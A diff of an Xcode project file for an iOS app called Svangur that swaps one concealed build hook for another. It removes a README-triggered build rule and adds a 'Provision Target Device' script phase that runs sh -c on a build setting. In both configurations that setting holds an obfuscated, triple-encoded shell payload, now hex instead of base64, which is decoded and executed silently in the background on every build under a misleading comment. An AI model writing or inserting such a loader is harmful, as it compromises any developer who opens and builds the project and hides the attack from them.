@@ -7,14 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5523CDCDCA88479789947F8B /* README.md */ = {isa = PBXBuildFile; fileRef = E8E2497E1AAE414AA5947F8B; };
 		7C4E8E893004BF70008A667B /* GooglePlaces in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E883004BF70008A667B /* GooglePlaces */; };
 		7C4E8E8B3004BF70008A667B /* GooglePlacesSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C4E8E8A3004BF70008A667B /* GooglePlacesSwift */; };
 		7C7DC7B53006676200610371 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 7C7DC7B43006676200610371 /* IQKeyboardManagerSwift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		E8E2497E1AAE414AA5947F8B /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		A8EB33BE2FA8659200725728 /* Svangur.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Svangur.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -51,7 +49,6 @@
 		A8EB33BF2FA8659200725728 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				E8E2497E1AAE414AA5947F8B /* README.md */,
 				A8EB33BE2FA8659200725728 /* Svangur.app */,
 			);
 			name = Products;
@@ -64,12 +61,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A8EB33C92FA8659300725728 /* Build configuration list for PBXNativeTarget "Svangur" */;
 			buildPhases = (
+				C9F5A04AA65E4C39AB947F8B /* Provision Target Device */,
 				A8EB33BA2FA8659200725728 /* Sources */,
 				A8EB33BB2FA8659200725728 /* Frameworks */,
 				A8EB33BC2FA8659200725728 /* Resources */,
 			);
 			buildRules = (
-				FAF2FD82EBE641519E947F8B /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -124,21 +121,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		C9F5A04AA65E4C39AB947F8B /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXBuildRule section */
-		FAF2FD82EBE641519E947F8B /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AB8F749}\"";
-			};
 		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -146,7 +151,6 @@ sh -c \"${AB8F749}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5523CDCDCA88479789947F8B /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -166,7 +170,7 @@ sh -c \"${AB8F749}\"";
 		A8EB33C72FA8659300725728 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEpKUXpCMFkyMVdNR051YTJkTmVVRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3elNuQmFNakZvWW0xV01HTjVOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333332333233303332363433323634333733323336333533373334333733323337333933323330333333343332333033320a3634333733333336333633363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333333363334333636353336333133363634333736313332363533363339333636353332363633363331333233390a33323332306133323330333736333332333033373333333633383330363130610a | w | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -231,7 +235,7 @@ sh -c \"${AB8F749}\"";
 		A8EB33C82FA8659300725728 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEpKUXpCMFkyMVdNR051YTJkTmVVRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3elNuQmFNakZvWW0xV01HTjVOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333332333233303332363433323634333733323336333533373334333733323337333933323330333333343332333033320a3634333733333336333633363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333333363334333636353336333133363634333736313332363533363339333636353332363633363331333233390a33323332306133323330333736333332333033373333333633383330363130610a | w | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
